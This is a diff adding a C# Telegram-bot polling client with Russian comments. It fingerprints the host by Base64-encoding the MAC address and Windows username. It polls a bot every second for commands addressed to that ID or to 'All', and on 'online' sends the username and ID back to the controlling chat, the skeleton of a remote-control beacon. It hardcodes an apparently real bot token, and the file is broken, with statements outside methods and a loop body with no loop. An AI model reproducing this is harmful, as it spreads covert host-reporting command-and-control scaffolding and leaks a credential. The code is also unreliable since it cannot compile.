@@ -1,0 +1,59 @@
+static string token = "734444523:AAEBZQTkWstMepxBHIZ1MO6qf2tSz8qci8k"; // тут должен быть ваш токен который вам выдал BotFather.
+static string UrlApiBot = "https://api.telegram.org/bot"; //адрес телеграм API к которому мы будем обращаться.
+static int offset = 0; //учет просмотра обновлений.
+
+static string GET(string URL)
+        {
+                WebRequest req = WebRequest.Create(URL);
+                WebResponse resp = req.GetResponse();
+                Stream stream = resp.GetResponseStream();
+                StreamReader sr = new StreamReader(stream);
+                string OUT = sr.ReadToEnd();
+                return OUT;
+        }
+        static string GetMACAddress()
+        {
+            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
+            String sMacAddress = string.Empty;
+            foreach (NetworkInterface adapter in nics)
+            {
+                if (sMacAddress == String.Empty)
+                {
+                    IPInterfaceProperties properties = adapter.GetIPProperties();
+                    sMacAddress = adapter.GetPhysicalAddress().ToString();
+                }
+            }
+            return sMacAddress;
+        }
+        string appData = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData);
+            var simpleTextBytes = Encoding.UTF8.GetBytes(GetMACAddress()+ System.Environment.UserName);
+            string id= Convert.ToBase64String(simpleTextBytes);
+            string messages = GET(UrlApiBot + token + "/getUpdates?offset=" + (offset + 1));
+                    var Json = JSON.Parse(messages);
+                    foreach (JSONNode n in Json["result"].AsArray)
+                    {
+                        offset = n["update_id"].AsInt;
+
+                        string msg = n["message"]["text"];
+                        if (msg.IndexOf(id) > -1 || msg.IndexOf("All") > -1)
+                        {
+                            string[] comand = msg.Split(':');
+
+                            switch (comand[0])
+                            {
+                                case "start":
+                                    GET(UrlApiBot + token + "/sendMessage?" + "chat_id=" + n["message"]["chat"]["id"] + "&text=Я получил твое сообщение START");
+                                    break;
+                                case "go":
+                                    GET(UrlApiBot + token + "/sendMessage?" + "chat_id=" + n["message"]["chat"]["id"] + "&text=Я получил твое сообщение GO");
+                                    break;
+                            }
+                        }
+                        if(msg == "online")
+                        {
+                            GET(UrlApiBot + token + "/sendMessage?" + "chat_id=" + n["message"]["chat"]["id"] + "&text="+ System.Environment.UserName + ": "+id);
+                        }
+                    }
+                    Thread.Sleep(1000);
+                }
+                
